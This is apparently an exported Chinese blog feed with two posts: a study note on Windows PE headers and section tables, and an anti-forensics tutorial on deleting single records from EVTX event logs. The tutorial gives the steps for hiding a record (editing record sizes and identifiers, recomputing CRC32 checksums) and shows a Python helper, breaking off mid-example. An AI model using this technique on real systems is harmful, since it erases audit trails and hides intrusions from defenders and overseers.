<h6 id="4-2-1-标准PE头"><a href="#4-2-1-标准PE头" class="headerlink" title="4.2.1 标准PE头"></a>4.2.1 标准PE头</h6><p>第二部分为<code>IMAGE_FILE_HEADER</code> 占20字节 称之为标准PE头</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_FILE_HEADER &#123;</span><br><span class="line">    WORD    Machine;                      &#x2F;&#x2F;识别CPU</span><br><span class="line">    WORD    NumberOfSections;             &#x2F;&#x2F;表示节的数量</span><br><span class="line">    DWORD   TimeDateStamp;                &#x2F;&#x2F;时间戳</span><br><span class="line">    DWORD   PointerToSymbolTable;         &#x2F;&#x2F;调试相关</span><br><span class="line">    DWORD   NumberOfSymbols;              &#x2F;&#x2F;调试相关</span><br><span class="line">    WORD    SizeOfOptionalHeader;         &#x2F;&#x2F;拓展PE头的大小</span><br><span class="line">    WORD    Characteristics;              &#x2F;&#x2F;文件属性</span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER; </span><br></pre></td></tr></table></figure>

<p>第一个成员 <code>WORD Machine</code> CPU识别</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define IMAGE_FILE_MACHINE_UNKNOWN 0</span><br><span class="line">#define IMAGE_FILE_MACHINE_TARGET_HOST 0x0001 &#x2F;&#x2F; Useful for indicating we want to interact with the host and not a WoW guest.</span><br><span class="line">#define IMAGE_FILE_MACHINE_I386 0x014c &#x2F;&#x2F; Intel 386.</span><br><span class="line">#define IMAGE_FILE_MACHINE_R3000 0x0162 &#x2F;&#x2F; MIPS little-endian,</span><br><span class="line">0x160 big-endian</span><br><span class="line">#define IMAGE_FILE_MACHINE_R4000 0x0166 &#x2F;&#x2F; MIPS little-endian</span><br><span class="line">#define IMAGE_FILE_MACHINE_R10000 0x0168 &#x2F;&#x2F; MIPS little-endian</span><br><span class="line">#define IMAGE_FILE_MACHINE_WCEMIPSV2 0x0169 &#x2F;&#x2F; MIPS little-endian WCEv2</span><br><span class="line">#define IMAGE_FILE_MACHINE_ALPHA 0x0184 &#x2F;&#x2F; Alpha_AXP</span><br><span class="line">#define IMAGE_FILE_MACHINE_SH3 0x01a2 &#x2F;&#x2F; SH3 little-endian</span><br><span class="line">#define IMAGE_FILE_MACHINE_SH3DSP 0x01a3</span><br><span class="line">#define IMAGE_FILE_MACHINE_SH3E 0x01a4 &#x2F;&#x2F; SH3E little-endian</span><br><span class="line">#define IMAGE_FILE_MACHINE_SH4 0x01a6 &#x2F;&#x2F; SH4 little-endian</span><br><span class="line">#define IMAGE_FILE_MACHINE_SH5 0x01a8 &#x2F;&#x2F; SH5</span><br><span class="line">#define IMAGE_FILE_MACHINE_ARM 0x01c0 &#x2F;&#x2F; ARM Little-Endian</span><br><span class="line">#define IMAGE_FILE_MACHINE_THUMB 0x01c2 &#x2F;&#x2F; ARM Thumb&#x2F;Thumb-2Little-Endian</span><br><span class="line">#define IMAGE_FILE_MACHINE_ARMNT 0x01c4 &#x2F;&#x2F; ARM Thumb-2 LittleEndian</span><br><span class="line">#define IMAGE_FILE_MACHINE_AM33 0x01d3</span><br><span class="line">#define IMAGE_FILE_MACHINE_POWERPC 0x01F0 &#x2F;&#x2F; IBM PowerPC LittleEndian</span><br><span class="line">#define IMAGE_FILE_MACHINE_POWERPCFP 0x01f1</span><br><span class="line">#define IMAGE_FILE_MACHINE_IA64 0x0200 &#x2F;&#x2F; Intel 64</span><br><span class="line">#define IMAGE_FILE_MACHINE_MIPS16 0x0266 &#x2F;&#x2F; MIPS</span><br><span class="line">#define IMAGE_FILE_MACHINE_ALPHA64 0x0284 &#x2F;&#x2F; ALPHA64</span><br><span class="line">#define IMAGE_FILE_MACHINE_MIPSFPU 0x0366 &#x2F;&#x2F; MIPS</span><br><span class="line">#define IMAGE_FILE_MACHINE_MIPSFPU16 0x0466 &#x2F;&#x2F; MIPS</span><br><span class="line">#define IMAGE_FILE_MACHINE_AXP64 IMAGE_FILE_MACHINE_ALPHA64</span><br><span class="line">#define IMAGE_FILE_MACHINE_TRICORE 0x0520 &#x2F;&#x2F; Infineon</span><br><span class="line">#define IMAGE_FILE_MACHINE_CEF 0x0CEF</span><br><span class="line">#define IMAGE_FILE_MACHINE_EBC 0x0EBC &#x2F;&#x2F; EFI Byte Code</span><br><span class="line">#define IMAGE_FILE_MACHINE_AMD64 0x8664 &#x2F;&#x2F; AMD64 (K8)</span><br><span class="line">#define IMAGE_FILE_MACHINE_M32R 0x9041 &#x2F;&#x2F; M32R little-endian</span><br><span class="line">#define IMAGE_FILE_MACHINE_ARM64 0xAA64 &#x2F;&#x2F; ARM64 Little-Endian</span><br><span class="line">#define IMAGE_FILE_MACHINE_CEE 0xC0EE</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>第二个成员 <code>WORD NumberOfSections</code> 表示当前PE文件中节的数量</p>
<p>第三个成员<code>DWORD TimeDateStamp</code>    表示编译器编译时的时间戳</p>
<p>第四个成员<code>DWORD PointerToSymbolTable</code> 和第五个成员<code>DWORD NumberOfSymbols</code>为调试相关暂不去了解</p>
<p>第六个成员<code>WORD SizeOfOptionalHeader</code> 表示PE拓展头的大小</p>
<p>第七个成员<code>WORD Characteristics;</code> 表示当前PE文件属性</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define IMAGE_FILE_RELOCS_STRIPPED           0x0001  &#x2F;&#x2F; Relocation info stripped from file.</span><br><span class="line">#define IMAGE_FILE_EXECUTABLE_IMAGE          0x0002  &#x2F;&#x2F; File is executable  (i.e. no unresolved external references).</span><br><span class="line">#define IMAGE_FILE_LINE_NUMS_STRIPPED        0x0004  &#x2F;&#x2F; Line nunbers stripped from file.</span><br><span class="line">#define IMAGE_FILE_LOCAL_SYMS_STRIPPED       0x0008  &#x2F;&#x2F; Local symbols stripped from file.</span><br><span class="line">#define IMAGE_FILE_AGGRESIVE_WS_TRIM         0x0010  &#x2F;&#x2F; Aggressively trim working set</span><br><span class="line">#define IMAGE_FILE_LARGE_ADDRESS_AWARE       0x0020  &#x2F;&#x2F; App can handle &gt;2gb addresses</span><br><span class="line">#define IMAGE_FILE_BYTES_REVERSED_LO         0x0080  &#x2F;&#x2F; Bytes of machine word are reversed.</span><br><span class="line">#define IMAGE_FILE_32BIT_MACHINE             0x0100  &#x2F;&#x2F; 32 bit word machine.</span><br><span class="line">#define IMAGE_FILE_DEBUG_STRIPPED            0x0200  &#x2F;&#x2F; Debugging info stripped from file in .DBG file</span><br><span class="line">#define IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP   0x0400  &#x2F;&#x2F; If Image is on removable media, copy and run from the swap file.</span><br><span class="line">#define IMAGE_FILE_NET_RUN_FROM_SWAP         0x0800  &#x2F;&#x2F; If Image is on Net, copy and run from the swap file.</span><br><span class="line">#define IMAGE_FILE_SYSTEM                    0x1000  &#x2F;&#x2F; System File.</span><br><span class="line">#define IMAGE_FILE_DLL                       0x2000  &#x2F;&#x2F; File is a DLL.</span><br><span class="line">#define IMAGE_FILE_UP_SYSTEM_ONLY            0x4000  &#x2F;&#x2F; File should only be run on a UP machine</span><br><span class="line">#define IMAGE_FILE_BYTES_REVERSED_HI         0x8000  &#x2F;&#x2F; Bytes of machine word are reversed.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<h6 id="4-2-2-拓展PE头"><a href="#4-2-2-拓展PE头" class="headerlink" title="4.2.2 拓展PE头"></a>4.2.2 拓展PE头</h6><p>第三部分为<code>_IMAGE_OPTIONAL_HEADER</code> PE可选头，在32位下是224字节，在64位下是240字节,下面位32位下的拓展PE头</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_OPTIONAL_HEADER &#123;</span><br><span class="line">    &#x2F;&#x2F;</span><br><span class="line">    &#x2F;&#x2F; Standard fields.</span><br><span class="line">    &#x2F;&#x2F;</span><br><span class="line">    WORD    Magic;                  &#x2F;&#x2F;文件类型标识  0x10B 32位镜像文件 0x20B;0x107 ROM镜像 ;64位镜像文件</span><br><span class="line">    BYTE    MajorLinkerVersion;</span><br><span class="line">    BYTE    MinorLinkerVersion;</span><br><span class="line">    DWORD   SizeOfCode;             &#x2F;&#x2F; .text总大小</span><br><span class="line">    DWORD   SizeOfInitializedData;  &#x2F;&#x2F; .data总大小</span><br><span class="line">    DWORD   SizeOfUninitializedData;&#x2F;&#x2F; .bss总大小</span><br><span class="line">    DWORD   AddressOfEntryPoint;    &#x2F;&#x2F; 程序虚拟入口地址</span><br><span class="line">    DWORD   BaseOfCode;             &#x2F;&#x2F; 代码基址</span><br><span class="line">    DWORD   BaseOfData;             &#x2F;&#x2F; 数据基址</span><br><span class="line">    &#x2F;&#x2F;</span><br><span class="line">    &#x2F;&#x2F; NT additional fields.</span><br><span class="line">    &#x2F;&#x2F;</span><br><span class="line">    DWORD   ImageBase;              &#x2F;&#x2F; 程序入口   dll默认是10000000h windwos ce的exe默认是00010000h windows系列exe默认是004000000h</span><br><span class="line">    DWORD   SectionAlignment;       &#x2F;&#x2F; 内存对齐</span><br><span class="line">    DWORD   FileAlignment;          &#x2F;&#x2F; 文件对齐</span><br><span class="line">    WORD    MajorOperatingSystemVersion;</span><br><span class="line">    WORD    MinorOperatingSystemVersion;</span><br><span class="line">    WORD    MajorImageVersion;</span><br><span class="line">    WORD    MinorImageVersion;</span><br><span class="line">    WORD    MajorSubsystemVersion;</span><br><span class="line">    WORD    MinorSubsystemVersion;</span><br><span class="line">    DWORD   Win32VersionValue;      </span><br><span class="line">    DWORD   SizeOfImage;            &#x2F;&#x2F; PE总大小</span><br><span class="line">    DWORD   SizeOfHeaders;          &#x2F;&#x2F; 头的总大小</span><br><span class="line">    DWORD   CheckSum;               &#x2F;&#x2F; 校验和(用于检测文件是否被修改)</span><br><span class="line">    WORD    Subsystem;              </span><br><span class="line">    WORD    DllCharacteristics;     &#x2F;&#x2F;dll文件特性</span><br><span class="line">    DWORD   SizeOfStackReserve;</span><br><span class="line">    DWORD   SizeOfStackCommit;</span><br><span class="line">    DWORD   SizeOfHeapReserve;</span><br><span class="line">    DWORD   SizeOfHeapCommit;</span><br><span class="line">    DWORD   LoaderFlags;</span><br><span class="line">    DWORD   NumberOfRvaAndSizes;</span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure>

<p>WORD Magic;文件类型标识</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x10B表明这是一个32位镜像文件。</span><br><span class="line">0x107表明这是一个ROM镜像。</span><br><span class="line">0x20B表明这是一个64位镜像文件。</span><br></pre></td></tr></table></figure>

<p><code>BYTE MajorLinkerVersion;</code> 链接器主版本号（BYTE 2位16） </p>
<p><code>BYTE MinorLinkerVersion;</code> 链接器副版本号 </p>
<p><code>DWORD SizeOfCode;</code> .text总大小 </p>
<p><code>DWORD SizeOfInitializedData;</code> .data总大小 </p>
<p><code>DWORD SizeOfUninitializedData;</code> .bss总大小 </p>
<p>bss：BSS段通常是指用来存放程序中未初始化的或者初始化为0的全局变量和静态变量的一块内存区域。特点是可读写的，在程序执行之前BSS段会自动清0。</p>
<br>

<p><code>WORD  DllCharacteristics; </code> PE文件特性</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE 0x0040     &#x2F;&#x2F; DLL can move.</span><br><span class="line">#define IMAGE_DLLCHARACTERISTICS_FORCE_INTEGRITY    0x0080     &#x2F;&#x2F; Code Integrity Image</span><br><span class="line">#define IMAGE_DLLCHARACTERISTICS_NX_COMPAT    0x0100     &#x2F;&#x2F; Image is NX compatible</span><br><span class="line">#define IMAGE_DLLCHARACTERISTICS_NO_ISOLATION 0x0200     &#x2F;&#x2F; Image understands isolation and doesn&#39;t want it</span><br><span class="line">#define IMAGE_DLLCHARACTERISTICS_NO_SEH       0x0400     &#x2F;&#x2F; Image does not use SEH.  No SE handler may reside in this image</span><br><span class="line">&#x2F;&#x2F;seh的保护机制</span><br><span class="line">#define IMAGE_DLLCHARACTERISTICS_NO_BIND      0x0800     &#x2F;&#x2F; Do not bind this image.</span><br><span class="line">#define IMAGE_DLLCHARACTERISTICS_APPCONTAINER 0x1000     &#x2F;&#x2F; Image should execute in an AppContainer</span><br><span class="line">#define IMAGE_DLLCHARACTERISTICS_WDM_DRIVER   0x2000     &#x2F;&#x2F; Driver uses WDM model</span><br><span class="line">#define IMAGE_DLLCHARACTERISTICS_GUARD_CF     0x4000     &#x2F;&#x2F; Image supports Control Flow Guard.</span><br><span class="line">#define IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE     0x8000</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<h4 id="4-3-PE节表"><a href="#4-3-PE节表" class="headerlink" title="4.3 PE节表"></a>4.3 PE节表</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_SECTION_HEADER &#123;</span><br><span class="line">    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];    &#x2F;&#x2F;节名</span><br><span class="line">    union &#123; &#x2F;&#x2F;二选一 通常选后者，音乐不知道具体物理地址</span><br><span class="line">            DWORD   PhysicalAddress;          &#x2F;&#x2F;本节物理地址</span><br><span class="line">            DWORD   VirtualSize;              &#x2F;&#x2F;本节实际大小  </span><br><span class="line">    &#125; Misc;</span><br><span class="line">    DWORD   VirtualAddress;                   &#x2F;&#x2F;在内存中的偏移地址  加上ImageBase才是内存的真正地址</span><br><span class="line">    DWORD   SizeOfRawData;                    &#x2F;&#x2F;本节在磁盘中的大小</span><br><span class="line">    DWORD   PointerToRawData;                 &#x2F;&#x2F;本节在磁盘中的偏移量</span><br><span class="line">    DWORD   PointerToRelocations;</span><br><span class="line">    DWORD   PointerToLinenumbers;</span><br><span class="line">    WORD    NumberOfRelocations;</span><br><span class="line">    WORD    NumberOfLinenumbers;</span><br><span class="line">    DWORD   Characteristics;                  &#x2F;&#x2F;节的属性</span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<br>

<p>…. </p>
<br>

<br>

<br>

<h4 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h4><h5 id="1-判断样本为dll还是exe"><a href="#1-判断样本为dll还是exe" class="headerlink" title="1.判断样本为dll还是exe"></a>1.判断样本为dll还是exe</h5><p>样本3的文件特征位 0x2102 根据文件特征表  0x2000（dll）+0x0100(32位)+0x0002（可执行文件） </p>
<p>说明该文件为一个可执行的32位dll文件</p>
<p><img src="/posts/d8527941/5.png"></p>
<p>样本4的文件特征为0x0103 即(0x0100+ 0x0002+0x0001) 说明是一个32位可执行的exe</p>
<p><img src="/posts/d8527941/6.png"></p>
<p>因此可以判断样本3为dll文件，样本4为exe文件（如果为XX 01就是一个exe文件，如果是XX 2X说明是dll文件）</p>
<h5 id="2-计算样本的编译时间"><a href="#2-计算样本的编译时间" class="headerlink" title="2.计算样本的编译时间"></a>2.计算样本的编译时间</h5><p>时间戳在NT头后</p>
<p><img src="/posts/d8527941/7.png"></p>
<br>

<p><img src="/posts/d8527941/9.png"></p>
<p>可根据此找到样本3的时间戳为 <code>0x169FCED5</code>   后面 0x00E0 -&gt; 224 说明是32位 </p>
<p>计算方法如下</p>
<p><img src="/posts/d8527941/10.png"></p>
<br>

<p><img src="/posts/d8527941/11.png"></p>
<br>

<h5 id="3-在OD中去对照查看地址"><a href="#3-在OD中去对照查看地址" class="headerlink" title="3.在OD中去对照查看地址"></a>3.在OD中去对照查看地址</h5><p><img src="/posts/d8527941/12.png"></p>
<p>样本3中 </p>
<p><code>AddressOfEntryPoint</code>  程序虚拟入口地址为   <code>0x0002AE57h</code></p>
<p><code>BaseOfCode</code>  代码基址为 <code>0x00001000h</code></p>
<p><code>BaseOfData</code>  数据基址为 <code>0x0003F000h</code></p>
<p><code>ImageBase</code>  为 <code>0x10000000h</code></p>
<p>使用OD打开后 第一行为 <code>AE57</code>  即 程序的虚拟入口地址</p>
<p><img src="/posts/d8527941/13.png"></p>
<p>第一行的地址为 1000h  即BaseOfCode （代码基址地址）</p>
<p>前面为1000 0000h 即 ImageBase（dll默认为 0x10000000h）</p>
]]></content>
  </entry>
  <entry>
    <title>痕迹清理-Windows篇-02</title>
    <url>/posts/41ffc4f2/</url>
    <content><![CDATA[<p>单条日志清理</p>
<p> 参考三好大佬的文章 </p>
<p><a href="https://3gstudent.github.io/Windows-XML-Event-Log-(EVTX)%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E6%B8%85%E9%99%A4-%E4%B8%80-%E5%88%A0%E9%99%A4%E6%80%9D%E8%B7%AF%E4%B8%8E%E5%AE%9E%E4%BE%8B">https://3gstudent.github.io/Windows-XML-Event-Log-(EVTX)%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E6%B8%85%E9%99%A4-%E4%B8%80-%E5%88%A0%E9%99%A4%E6%80%9D%E8%B7%AF%E4%B8%8E%E5%AE%9E%E4%BE%8B</a></p>
<h3 id="evtx基础知识"><a href="#evtx基础知识" class="headerlink" title="evtx基础知识"></a>evtx基础知识</h3><p>参考<code> https://github.com/libyal/libevtx/blob/main/documentation/Windows XML Event Log (EVTX).asciidoc</code> </p>
<p>evtx文件结构包含3部分</p>
<ul>
<li>file header</li>
<li>chunks</li>
<li>trailing empty values</li>
</ul>
<h4 id="file-header"><a href="#file-header" class="headerlink" title="file header"></a>file header</h4><p><a href="https://github.com/libyal/libevtx/blob/main/documentation/Windows%20XML%20Event%20Log%20(EVTX).asciidoc#2-file-header">https://github.com/libyal/libevtx/blob/main/documentation/Windows%20XML%20Event%20Log%20(EVTX).asciidoc#2-file-header</a></p>
<h3 id="chunks"><a href="#chunks" class="headerlink" title="chunks"></a>chunks</h3><p><a href="https://github.com/libyal/libevtx/blob/main/documentation/Windows%20XML%20Event%20Log%20(EVTX).asciidoc#3-chunk">https://github.com/libyal/libevtx/blob/main/documentation/Windows%20XML%20Event%20Log%20(EVTX).asciidoc#3-chunk</a></p>
<h4 id="trailing-empty-values"><a href="#trailing-empty-values" class="headerlink" title="trailing empty values"></a>trailing empty values</h4><p><a href="https://github.com/libyal/libevtx/blob/master/documentation/Windows%20XML%20Event%20Log%20%28EVTX%29.asciidoc#32-event-record">https://github.com/libyal/libevtx/blob/master/documentation/Windows%20XML%20Event%20Log%20%28EVTX%29.asciidoc#32-event-record</a></p>
<h3 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h3><h4 id="查看日志文件"><a href="#查看日志文件" class="headerlink" title="查看日志文件"></a>查看日志文件</h4><ul>
<li>使用事件查看器查看</li>
</ul>
<p><img src="/posts/41ffc4f2/1.png"></p>
<p>这里要删除的记录为1915</p>
<p>删除后效果如下</p>
<p><img src="/posts/41ffc4f2/2.png"></p>
<ul>
<li>使用python脚本查看</li>
</ul>
<p>可以使用该工具 <a href="https://github.com/williballenthin/python-evtx">https://github.com/williballenthin/python-evtx</a></p>
<p><code>python evtx_record_structure.py System.evtx 1915</code></p>
<p><img src="/posts/41ffc4f2/3.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\TEST\Desktop&gt;python evtx_record_structure.py System.evtx 1915</span><br><span class="line">00000000: 2A 2A 00 00 38 01 00 00  7B 07 00 00 00 00 00 00  **..8...&#123;.......</span><br><span class="line">00000010: 23 EB 07 A2 D4 FB D3 01  0F 01 01 00 0C 01 65 CE  #.............e.</span><br><span class="line">00000020: 1B C7 EE 0D 00 00 14 00  00 00 01 00 04 00 01 00  ................</span><br><span class="line">00000030: 04 00 02 00 06 00 02 00  06 00 02 00 06 00 08 00  ................</span><br><span class="line">00000040: 15 00 08 00 11 00 00 00  00 00 04 00 08 00 04 00  ................</span><br><span class="line">00000050: 08 00 08 00 0A 00 01 00  04 00 00 00 00 00 00 00  ................</span><br><span class="line">00000060: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000070: 00 00 00 00 00 00 8B 00  21 00 04 00 00 00 7C 1B  ........!.....|.</span><br><span class="line">00000080: 00 40 00 00 00 00 00 00  80 80 23 EB 07 A2 D4 FB  .@........#.....</span><br><span class="line">00000090: D3 01 D8 01 00 00 9C 07  00 00 7B 07 00 00 00 00  ..........&#123;.....</span><br><span class="line">000000A0: 00 00 00 0F 01 01 00 0C  01 DE E1 DC 34 6C 11 00  ............4l..</span><br><span class="line">000000B0: 00 04 00 00 00 4E 00 01  00 08 00 01 00 04 00 08  .....N..........</span><br><span class="line">000000C0: 00 0E 00 0E 00 42 00 61  00 63 00 6B 00 67 00 72  .....B.a.c.k.g.r</span><br><span class="line">000000D0: 00 6F 00 75 00 6E 00 64  00 20 00 49 00 6E 00 74  .o.u.n.d. .I.n.t</span><br><span class="line">000000E0: 00 65 00 6C 00 6C 00 69  00 67 00 65 00 6E 00 74  .e.l.l.i.g.e.n.t</span><br><span class="line">000000F0: 00 20 00 54 00 72 00 61  00 6E 00 73 00 66 00 65  . .T.r.a.n.s.f.e</span><br><span class="line">00000100: 00 72 00 20 00 53 00 65  00 72 00 76 00 69 00 63  .r. .S.e.r.v.i.c</span><br><span class="line">00000110: 00 65 00 63 6B 28 57 D0  8F 4C 88 0E 00 00 00 42  .e.ck(W..L.....B</span><br><span class="line">00000120: 00 49 00 54 00 53 00 2F  00 34 00 00 00 00 00 00  .I.T.S.&#x2F;.4......</span><br><span class="line">00000130: 15 00 00 00 38 01 00 00                           ....8...</span><br><span class="line">record(absolute_offset&#x3D;8776)</span><br><span class="line">RootNode(offset&#x3D;0x18)</span><br><span class="line">  StreamStartNode(offset&#x3D;0x18)</span><br><span class="line">  TemplateInstanceNode(offset&#x3D;0x1c, resident&#x3D;False)</span><br><span class="line">  Substitutions(offset&#x3D;0x26)</span><br><span class="line">    UnsignedByteTypeNode(offset&#x3D;0x7a) --&gt; 4</span><br><span class="line">    UnsignedByteTypeNode(offset&#x3D;0x7b) --&gt; 0</span><br><span class="line">    UnsignedWordTypeNode(offset&#x3D;0x7c) --&gt; 0</span><br><span class="line">    UnsignedWordTypeNode(offset&#x3D;0x7e) --&gt; 7036</span><br><span class="line">    UnsignedWordTypeNode(offset&#x3D;0x80) --&gt; 16384</span><br><span class="line">    Hex64TypeNode(offset&#x3D;0x82) --&gt; 0x8080000000000000</span><br><span class="line">    FiletimeTypeNode(offset&#x3D;0x8a) --&gt; 2018-06-04 07:21:19.394281</span><br><span class="line">    NullTypeNode(offset&#x3D;0x92)</span><br><span class="line">    UnsignedDwordTypeNode(offset&#x3D;0x92) --&gt; 472</span><br><span class="line">    UnsignedDwordTypeNode(offset&#x3D;0x96) --&gt; 1948</span><br><span class="line">    UnsignedQwordTypeNode(offset&#x3D;0x9a) --&gt; 1915</span><br><span class="line">    UnsignedByteTypeNode(offset&#x3D;0xa2) --&gt; 0</span><br><span class="line">    NullTypeNode(offset&#x3D;0xa3)</span><br><span class="line">    NullTypeNode(offset&#x3D;0xa3)</span><br><span class="line">    NullTypeNode(offset&#x3D;0xa3)</span><br><span class="line">    NullTypeNode(offset&#x3D;0xa3)</span><br><span class="line">    NullTypeNode(offset&#x3D;0xa3)</span><br><span class="line">    NullTypeNode(offset&#x3D;0xa3)</span><br><span class="line">    NullTypeNode(offset&#x3D;0xa3)</span><br><span class="line">    BXmlTypeNode(offset&#x3D;0xa3) --&gt;</span><br><span class="line">      RootNode(offset&#x3D;0xa3)</span><br><span class="line">        StreamStartNode(offset&#x3D;0xa3)</span><br><span class="line">        TemplateInstanceNode(offset&#x3D;0xa7, resident&#x3D;False)</span><br><span class="line">        Substitutions(offset&#x3D;0xb1)</span><br><span class="line">          WstringTypeNode(offset&#x3D;0xc5) --&gt; Background Intelligent Transfer Servi</span><br><span class="line">ce</span><br><span class="line">          WstringTypeNode(offset&#x3D;0x113) --&gt; 正在运行</span><br><span class="line">          UnsignedDwordTypeNode(offset&#x3D;0x11b) --&gt; 14</span><br><span class="line">          BinaryTypeNode(offset&#x3D;0x11f) --&gt; QgBJAFQAUwAvADQAAAA&#x3D;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;Event xmlns&#x3D;&quot;http:&#x2F;&#x2F;schemas.microsoft.com&#x2F;win&#x2F;2004&#x2F;08&#x2F;events&#x2F;event&quot;&gt;&lt;System&gt;&lt;Pr</span><br><span class="line">ovider Name&#x3D;&quot;Service Control Manager&quot; Guid&#x3D;&quot;&#123;555908d1-a6d7-4695-8e1e-26931d2012f</span><br><span class="line">4&#125;&quot; EventSourceName&#x3D;&quot;Service Control Manager&quot;&gt;&lt;&#x2F;Provider&gt;</span><br><span class="line">&lt;EventID Qualifiers&#x3D;&quot;16384&quot;&gt;7036&lt;&#x2F;EventID&gt;</span><br><span class="line">&lt;Version&gt;0&lt;&#x2F;Version&gt;</span><br><span class="line">&lt;Level&gt;4&lt;&#x2F;Level&gt;</span><br><span class="line">&lt;Task&gt;0&lt;&#x2F;Task&gt;</span><br><span class="line">&lt;Opcode&gt;0&lt;&#x2F;Opcode&gt;</span><br><span class="line">&lt;Keywords&gt;0x8080000000000000&lt;&#x2F;Keywords&gt;</span><br><span class="line">&lt;TimeCreated SystemTime&#x3D;&quot;2018-06-04 07:21:19.394281&quot;&gt;&lt;&#x2F;TimeCreated&gt;</span><br><span class="line">&lt;EventRecordID&gt;1915&lt;&#x2F;EventRecordID&gt;</span><br><span class="line">&lt;Correlation ActivityID&#x3D;&quot;&quot; RelatedActivityID&#x3D;&quot;&quot;&gt;&lt;&#x2F;Correlation&gt;</span><br><span class="line">&lt;Execution ProcessID&#x3D;&quot;472&quot; ThreadID&#x3D;&quot;1948&quot;&gt;&lt;&#x2F;Execution&gt;</span><br><span class="line">&lt;Channel&gt;System&lt;&#x2F;Channel&gt;</span><br><span class="line">&lt;Computer&gt;WIN-E8C6J8CN50O&lt;&#x2F;Computer&gt;</span><br><span class="line">&lt;Security UserID&#x3D;&quot;&quot;&gt;&lt;&#x2F;Security&gt;</span><br><span class="line">&lt;&#x2F;System&gt;</span><br><span class="line">&lt;EventData&gt;&lt;Data Name&#x3D;&quot;param1&quot;&gt;Background Intelligent Transfer Service&lt;&#x2F;Data&gt;</span><br><span class="line">&lt;Data Name&#x3D;&quot;param2&quot;&gt;&amp;#27491;&amp;#22312;&amp;#36816;&amp;#34892;&lt;&#x2F;Data&gt;</span><br><span class="line">&lt;Binary&gt;QgBJAFQAUwAvADQAAAA&#x3D;&lt;&#x2F;Binary&gt;</span><br><span class="line">&lt;&#x2F;EventData&gt;</span><br><span class="line">&lt;&#x2F;Event&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="删除单条日志思路——覆盖"><a href="#删除单条日志思路——覆盖" class="headerlink" title="删除单条日志思路——覆盖"></a>删除单条日志思路——覆盖</h4><p>修改日志 Event Record size长度，然后覆盖掉下一条日志，这样windows在解析日志时，下一条日志就会被隐藏，从而实现所谓的单条目录的删除</p>
<p><img src="/posts/41ffc4f2/4.png" alt="从大佬那里抄的图"></p>
<p>具体方法:</p>
<ul>
<li><p>1.file header中的Next record identifier减一</p>
</li>
<li><p>2.重新计算file header 中的 chunksum</p>
</li>
<li><p>3.修改Event Record:</p>
<p>重新计算待删除Event Record前后长度，更新后续Event Record的Event record identifier</p>
</li>
<li><p>4.更新ElfChnk，</p>
</li>
</ul>
<h4 id="删除单条日志的实例"><a href="#删除单条日志的实例" class="headerlink" title="删除单条日志的实例"></a>删除单条日志的实例</h4><p>实例样本 <a href="https://github.com/3gstudent/Eventlogedit-evtx--Evolution/blob/master/System.evtx">https://github.com/3gstudent/Eventlogedit-evtx--Evolution/blob/master/System.evtx</a></p>
<h5 id="File-header-Next-record-identifier值-1"><a href="#File-header-Next-record-identifier值-1" class="headerlink" title="File header   Next record identifier值 -1"></a>File header   Next record identifier值 -1</h5><p>这里采用小端序 0x077c  减一后为 0x77b</p>
<p><img src="/posts/41ffc4f2/5.png" alt="修改后"></p>
<h5 id="重新计算checksum值"><a href="#重新计算checksum值" class="headerlink" title="重新计算checksum值"></a>重新计算checksum值</h5><p><img src="/posts/41ffc4f2/6.png" alt="原值"></p>
<p>计算前120bytes 的 CRC32，直接引用大佬的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii   </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crc2hex</span>(<span class="params">crc</span>):</span>   </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;%08x&#x27;</span> % (binascii.crc32(binascii.a2b_hex(crc)) &amp; <span class="number">0xffffffff</span>)     </span><br><span class="line"></span><br><span class="line">d=<span class="string">&#x27;456C6646696C6500000000000000000000000000000000007B0700000000000080000000010003000010010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span>  </span><br><span class="line">print(crc2hex(d)</span><br></pre></td></tr></table></figure>

<p>得到结果为 <code>ccc94756</code> 然后进行替换 </p>
<p><img src="/posts/41ffc4f2/7.png"></p>
